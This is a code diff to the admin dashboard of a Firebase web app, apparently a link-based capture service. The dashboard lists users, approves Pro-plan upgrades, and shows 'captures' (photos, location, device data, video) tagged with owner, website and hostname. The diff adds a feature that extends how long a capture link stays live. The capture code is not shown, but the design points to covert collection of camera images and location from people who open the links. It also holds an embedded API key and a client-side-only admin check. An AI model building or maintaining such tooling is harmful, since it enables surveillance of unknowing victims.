@@ -19,8 +19,8 @@
   .brand-text small{font-size:0.6rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--gold);}
   .admin-badge{padding:6px 14px;border-radius:20px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-weight:700;font-size:0.75rem;}
   .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:22px;padding:24px;margin-bottom:18px;box-shadow:0 20px 50px rgba(0,0,0,0.4);}
-  .card h2{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;margin-bottom:16px;display:flex;align-items:center;gap:10px;}
-  .card h2 .count-badge{padding:3px 10px;border-radius:20px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-size:0.7rem;font-weight:800;margin-left:auto;}
+  .card h2{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;margin-bottom:16px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
+  .card h2 .count-badge{padding:3px 10px;border-radius:20px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-size:0.7rem;font-weight:800;}
   button{padding:11px 20px;border-radius:10px;font-weight:600;font-size:0.85rem;cursor:pointer;transition:0.25s;font-family:inherit;border:none;display:inline-flex;align-items:center;justify-content:center;gap:6px;}
   button:active{transform:scale(0.97);}
   button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;}
@@ -63,6 +63,14 @@
   .empty-state .icon{font-size:3rem;margin-bottom:12px;}
   .spinner{width:44px;height:44px;border:4px solid rgba(251,191,36,0.2);border-top-color:var(--gold);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;}
   @keyframes spin{to{transform:rotate(360deg);}}
+  .capture-card{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;overflow:hidden;}
+  .capture-card img{width:100%;aspect-ratio:1;object-fit:cover;display:block;cursor:pointer;background:#000;}
+  .capture-info{padding:10px 12px;font-size:0.72rem;line-height:1.6;}
+  .capture-info .row{display:flex;gap:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:0.85;}
+  .capture-info .web{color:var(--accent);font-weight:600;}
+  .capture-info .time{opacity:0.5;font-size:0.66rem;margin-top:4px;}
+  .capture-actions{padding:0 10px 10px;display:flex;gap:6px;}
+  .capture-actions button{flex:1;padding:6px;font-size:0.68rem;}
   @media (max-width:480px){.container{padding:14px 12px 30px;}.card{padding:18px;}}
 </style>
 </head>
@@ -104,7 +112,7 @@
       <div style="display:flex;gap:10px;flex-wrap:wrap;">
         <button class="gold small" onclick="location.href='index.html'">🏠 Website</button>
         <button class="secondary small" onclick="location.href='dashboard.html'">📊 My Dashboard</button>
-        <button class="primary small" onclick="refreshAll()">🔄 Refresh</button>
+        <button class="primary small" onclick="location.reload()">🔄 Refresh</button>
       </div>
     </div>
   </div>
@@ -112,7 +120,7 @@
   <div id="tab-requests" class="hidden">
     <div class="card">
       <h2>📩 Full Access Requests <span class="count-badge" id="reqBadge">0</span></h2>
-      <p style="opacity:0.7;font-size:0.85rem;margin-bottom:16px;">Users ki Full Access requests. Approve karne se Pro plan mil jayega.</p>
+      <p style="opacity:0.7;font-size:0.85rem;margin-bottom:16px;">Approve karne se user ko Pro plan mil jayega.</p>
       <div id="requestsList"></div>
     </div>
   </div>
@@ -128,8 +136,8 @@
   <div id="tab-captures" class="hidden">
     <div class="card">
       <h2>🖼️ All Captures <span class="count-badge" id="captureBadge">0</span></h2>
-      <input type="search" id="captureSearch" placeholder="🔍 Search..." oninput="renderAllCaptures()">
-      <div id="capturesList" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;"></div>
+      <input type="search" id="captureSearch" placeholder="🔍 Search by website, owner, type..." oninput="renderAllCaptures()">
+      <div id="capturesList" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;"></div>
     </div>
   </div>
 </div>
@@ -139,7 +147,7 @@
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import { getAuth, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-import { getFirestore, collection, getDocs, doc, updateDoc, deleteDoc, onSnapshot, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+import { getFirestore, collection, doc, updateDoc, deleteDoc, onSnapshot, getDoc, Timestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
@@ -162,7 +170,6 @@ let allCaptures = [];
 let unsubUsers = null;
 let unsubRequests = null;
 let unsubCaptures = null;
-let adminVerified = false;
 
 window.showToast = function(msg, isError = false) {
   const t = document.getElementById("toast");
@@ -172,60 +179,40 @@ window.showToast = function(msg, isError = false) {
   t._to = setTimeout(() => t.className = "toast", 3500);
 }
 
-/* ========== AUTH CHECK - FIXED ========== */
 onAuthStateChanged(auth, async (user) => {
-  console.log("Auth state:", user ? user.email : "no user");
-
-  // No user - wait a bit then redirect
   if (!user) {
     setTimeout(() => {
-      if (!auth.currentUser) {
-        console.log("No user, redirecting to index");
-        location.href = "index.html";
-      }
+      if (!auth.currentUser) location.href = "index.html";
     }, 1500);
     return;
   }
-
-  // Check admin email
   if (user.email !== ADMIN_EMAIL) {
-    console.log("Not admin:", user.email);
-    showToast("You are not admin", true);
+    showToast("Not admin", true);
     setTimeout(() => location.href = "dashboard.html", 800);
     return;
   }
 
-  // ✅ Admin verified
-  adminVerified = true;
-  console.log("Admin verified:", user.email);
-
   document.getElementById("adminEmail").textContent = user.email.split("@")[0];
   document.getElementById("loadingView").classList.add("hidden");
   document.getElementById("adminView").classList.remove("hidden");
-
   await startListeners();
 });
 
 async function startListeners() {
   unsubUsers = onSnapshot(collection(db, "users"), (snap) => {
     allUsers = snap.docs.map(d => ({ id: d.id, ...d.data() }));
-    renderUsers();
-    updateStats();
-  }, err => console.error("users err:", err));
-
+    renderUsers(); updateStats();
+  });
   unsubRequests = onSnapshot(collection(db, "requests"), (snap) => {
     allRequests = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     allRequests.sort((a,b) => (b.createdAt?.seconds||0) - (a.createdAt?.seconds||0));
-    renderRequests();
-    updateStats();
-  }, err => console.error("req err:", err));
-
+    renderRequests(); updateStats();
+  });
   unsubCaptures = onSnapshot(collection(db, "captures"), (snap) => {
     allCaptures = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     allCaptures.sort((a,b) => (b.timestamp?.seconds||0) - (a.timestamp?.seconds||0));
-    renderAllCaptures();
-    updateStats();
-  }, err => console.error("cap err:", err));
+    renderAllCaptures(); updateStats();
+  });
 }
 
 function updateStats() {
@@ -233,7 +220,6 @@ function updateStats() {
   document.getElementById("sPro").textContent = allUsers.filter(u => u.plan === "pro").length;
   document.getElementById("sPending").textContent = allRequests.filter(r => r.status === "pending").length;
   document.getElementById("sCaptures").textContent = allCaptures.length;
-
   const pending = allRequests.filter(r => r.status === "pending").length;
   document.getElementById("reqCount").textContent = pending > 0 ? `(${pending})` : "";
   document.getElementById("reqBadge").textContent = allRequests.length;
@@ -250,11 +236,10 @@ window.switchTab = function(tab, el) {
   document.getElementById("tab-" + tab).classList.remove("hidden");
 }
 
-/* ===== REQUESTS ===== */
 function renderRequests() {
   const list = document.getElementById("requestsList");
   if (allRequests.length === 0) {
-    list.innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>Abhi koi request nahi aayi</p></div>`;
+    list.innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>No requests yet</p></div>`;
     return;
   }
   list.innerHTML = allRequests.map(r => {
@@ -263,9 +248,7 @@ function renderRequests() {
     const time = r.createdAt?.seconds ? new Date(r.createdAt.seconds*1000).toLocaleString() : "-";
     let actions = "";
     if (status === "pending") {
-      actions = `
-        <button class="success small" onclick="approveRequest('${r.id}', '${r.userId}')">✅ Approve</button>
-        <button class="danger small" onclick="rejectRequest('${r.id}')">❌ Reject</button>`;
+      actions = `<button class="success small" onclick="approveRequest('${r.id}', '${r.userId}')">✅ Approve</button><button class="danger small" onclick="rejectRequest('${r.id}')">❌ Reject</button>`;
     } else if (status === "approved") {
       actions = `<button class="danger small" onclick="rejectRequest('${r.id}')">Revoke</button>`;
     } else {
@@ -288,30 +271,29 @@ function renderRequests() {
 }
 
 window.approveRequest = async function(reqId, userId) {
-  if (!confirm("Approve this request? User will get Pro plan.")) return;
+  if (!confirm("Approve?")) return;
   try {
     await updateDoc(doc(db, "requests", reqId), { status: "approved", approvedAt: new Date() });
     await updateDoc(doc(db, "users", userId), { plan: "pro" });
-    showToast("✅ Approved! User is now Pro.");
+    showToast("✅ Approved!");
   } catch (e) { showToast("Fail: " + e.message, true); }
 }
 
 window.rejectRequest = async function(reqId) {
-  if (!confirm("Reject this request?")) return;
+  if (!confirm("Reject?")) return;
   try {
     await updateDoc(doc(db, "requests", reqId), { status: "rejected" });
-    showToast("Request rejected");
-  } catch (e) { showToast("Fail: " + e.message, true); }
+    showToast("Rejected");
+  } catch (e) { showToast("Fail", true); }
 }
 
-/* ===== USERS ===== */
 function renderUsers() {
   const list = document.getElementById("usersList");
   const search = (document.getElementById("userSearch")?.value || "").toLowerCase();
   let filtered = allUsers;
   if (search) filtered = filtered.filter(u => (u.name||"").toLowerCase().includes(search) || (u.email||"").toLowerCase().includes(search));
   if (filtered.length === 0) {
-    list.innerHTML = `<div class="empty-state"><div class="icon">👥</div><p>Koi user nahi mila</p></div>`;
+    list.innerHTML = `<div class="empty-state"><div class="icon">👥</div><p>No users</p></div>`;
     return;
   }
   list.innerHTML = filtered.map(u => {
@@ -340,24 +322,23 @@ window.makePro = async function(userId) {
 }
 
 window.makeTrial = async function(userId) {
-  if (!confirm("Demote to Trial?")) return;
+  if (!confirm("Demote?")) return;
   try { await updateDoc(doc(db, "users", userId), { plan: "trial", linksUsed: 0 }); showToast("Trial"); }
   catch (e) { showToast("Fail", true); }
 }
 
-/* ===== CAPTURES ===== */
 function renderAllCaptures() {
   const list = document.getElementById("capturesList");
   const search = (document.getElementById("captureSearch")?.value || "").toLowerCase();
   let filtered = allCaptures;
   if (search) filtered = filtered.filter(c => JSON.stringify(c).toLowerCase().includes(search));
   if (filtered.length === 0) {
-    list.innerHTML = `<div class="empty-state" style="grid-column:1/-1;"><div class="icon">🖼️</div><p>Koi capture nahi mila</p></div>`;
+    list.innerHTML = `<div class="empty-state" style="grid-column:1/-1;"><div class="icon">🖼️</div><p>No captures</p></div>`;
     return;
   }
   list.innerHTML = filtered.map(c => {
     let thumb = "";
-    if (c.photo) thumb = `<img src="${c.photo}" onclick="viewCapture('${c.id}')" loading="lazy" style="width:100%;aspect-ratio:1;object-fit:cover;cursor:pointer;background:#000;">`;
+    if (c.photo) thumb = `<img src="${c.photo}" onclick="viewCapture('${c.id}')" loading="lazy">`;
     else if (c.type === "location") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(34,211,238,0.1);">📍</div>`;
     else if (c.type === "device") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(168,85,247,0.1);">📱</div>`;
     else if (c.type === "video") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(239,68,68,0.1);">🎥</div>`;
@@ -366,19 +347,77 @@ function renderAllCaptures() {
     const owner = allUsers.find(u => u.id === c.ownerId);
     const ownerName = owner?.name || owner?.email?.split("@")[0] || "Unknown";
     const time = c.timestamp?.seconds ? new Date(c.timestamp.seconds*1000).toLocaleString() : "-";
+    const website = c.website || "Modsir Tools";
+    const hostname = c.hostname || "-";
+
     return `
-      <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;overflow:hidden;">
+      <div class="capture-card">
         ${thumb}
-        <div style="padding:10px 12px;font-size:0.72rem;line-height:1.5;">
-          <div>👤 ${escapeHtml(ownerName)}</div>
-          <div>🏷️ ${c.type || c.feature}</div>
-          <div style="opacity:0.5;font-size:0.66rem;margin-top:4px;">🕒 ${time}</div>
+        <div class="capture-info">
+          <div class="row">👤 ${escapeHtml(ownerName)}</div>
+          <div class="row">🏷️ ${c.type || c.feature}</div>
+          <div class="row web">🌐 ${escapeHtml(website)}</div>
+          <div class="row" style="font-size:0.65rem;opacity:0.5;">${escapeHtml(hostname)}</div>
+          <div class="time">🕒 ${time}</div>
         </div>
-        <div style="padding:0 10px 10px;">
-          <button class="danger small" style="width:100%;padding:6px;font-size:0.7rem;" onclick="deleteCapture('${c.id}')">Delete</button>
+        <div class="capture-actions">
+          <button class="success small" onclick="extendCapture('${c.id}')">⏰ Extend</button>
+          <button class="danger small" onclick="deleteCapture('${c.id}')">🗑️</button>
         </div>
       </div>`;
   }).join("");
+}
+
+/* ===== EXTEND CAPTURE TIME ===== */
+window.extendCapture = async function(captureId) {
+  const choice = prompt(
+    "⏰ Kitna waqt badhana hai?\n\n" +
+    "1 → 1 ghanta\n" +
+    "2 → 6 ghante\n" +
+    "3 → 24 ghante\n" +
+    "4 → 7 din\n" +
+    "5 → Custom (minutes)\n\n" +
+    "Number likho (1-5):"
+  );
+
+  let additionalMinutes = 0;
+  if (choice === "1") additionalMinutes = 60;
+  else if (choice === "2") additionalMinutes = 360;
+  else if (choice === "3") additionalMinutes = 1440;
+  else if (choice === "4") additionalMinutes = 10080;
+  else if (choice === "5") {
+    const custom = prompt("Kitne minutes?");
+    additionalMinutes = parseInt(custom);
+    if (!additionalMinutes || additionalMinutes <= 0) return;
+  } else return;
+
+  try {
+    const captureSnap = await getDoc(doc(db, "captures", captureId));
+    if (!captureSnap.exists()) { showToast("Capture not found", true); return; }
+    const captureData = captureSnap.data();
+    const linkId = captureData.linkId;
+    if (!linkId) { showToast("Link ID not found", true); return; }
+
+    const linkSnap = await getDoc(doc(db, "links", linkId));
+    if (!linkSnap.exists()) { showToast("Original link not found", true); return; }
+    const linkData = linkSnap.data();
+
+    let currentExpiry = linkData.expiresAt?.seconds 
+      ? linkData.expiresAt.seconds * 1000 
+      : Date.now();
+
+    if (currentExpiry < Date.now()) currentExpiry = Date.now();
+    const newExpiry = new Date(currentExpiry + additionalMinutes * 60 * 1000);
+
+    await updateDoc(doc(db, "links", linkId), {
+      expiresAt: Timestamp.fromDate(newExpiry)
+    });
+
+    showToast(`✅ Link ${additionalMinutes} min extend!`);
+  } catch (e) {
+    console.error(e);
+    showToast("Extend fail: " + e.message, true);
+  }
 }
 
 window.viewCapture = function(id) {
@@ -394,8 +433,6 @@ window.deleteCapture = async function(id) {
   try { await deleteDoc(doc(db, "captures", id)); showToast("Deleted 🗑️"); }
   catch (e) { showToast("Fail", true); }
 }
-
-window.refreshAll = function() { location.reload(); }
 
 window.adminLogout = async function() {
   if (unsubUsers) unsubUsers();
